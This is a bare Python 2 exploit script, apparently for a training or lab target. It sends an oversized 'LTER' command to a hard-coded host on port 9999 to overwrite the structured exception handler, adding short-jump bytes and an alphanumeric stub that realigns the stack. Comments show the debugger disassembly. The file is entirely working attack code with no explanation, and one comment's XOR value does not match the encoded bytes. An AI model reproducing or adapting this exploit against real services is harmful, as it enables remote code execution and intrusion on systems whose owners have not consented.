#!/usr/bin/env python

# Stack starting with NSEH:
# 00B8FFDC   77 06            JA SHORT 00B8FFE4
# 00B8FFDE   76 04            JBE SHORT 00B8FFE4
# 00B8FFE0   0B12             OR EDX,DWORD PTR DS:[EDX]
# 00B8FFE2   50               PUSH EAX
# 00B8FFE3   6251 58          BOUND EDX,QWORD PTR DS:[ECX+58]
# 00B8FFE6   66:53            PUSH BX
# 00B8FFE8   66:58            POP AX
# 00B8FFEA   66:48            DEC AX
# 00B8FFEC   40               INC EAX
# 00B8FFED   50               PUSH EAX
# 00B8FFEE   5C               POP ESP
# 00B8FFEF   48               DEC EAX
# 00B8FFF0   66:2D 011F       SUB AX,1F01
# 00B8FFF4   40               INC EAX
# 00B8FFF5   66:50            PUSH AX
# 00B8FFF7   66:35 7312       XOR AX,1273
# 00B8FFFB   45               INC EBP
# 00B8FFFC   45               INC EBP
# 00B8FFFD   45               INC EBP
# 00B8FFFE   45               INC EBP
# 00B8FFFF   45               INC EBP

import sys
import socket

message  = "LTER "
message += 'A' * 3499
message += "\x77\x06\x76\x04"
message += "\x0b\x12\x50\x62"

jump  = "\x51\x58"  # push ecx / pop eax
jump += "\x66\x53"  # push bx
jump += "\x66\x58"  # pop ax
jump += "\x66\x48"  # dec ax
jump += "\x40"  # inc eax
jump += "\x50\x5c"  # push eax / pop esp
jump += "\x48"  # dec eax
jump += "\x66\x2d\x01\x1f"  # sub ax,0x1f01
jump += "\x40"  # inc eax
jump += "\x66\x50"  # push ax
jump += "\x66\x35\x73\x12"  # xor ax,0x1b03

message += jump 
message += 'E' * (4000 - 3499 - 4 - 4 - len(jump))
message += ".\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

s.send(message)
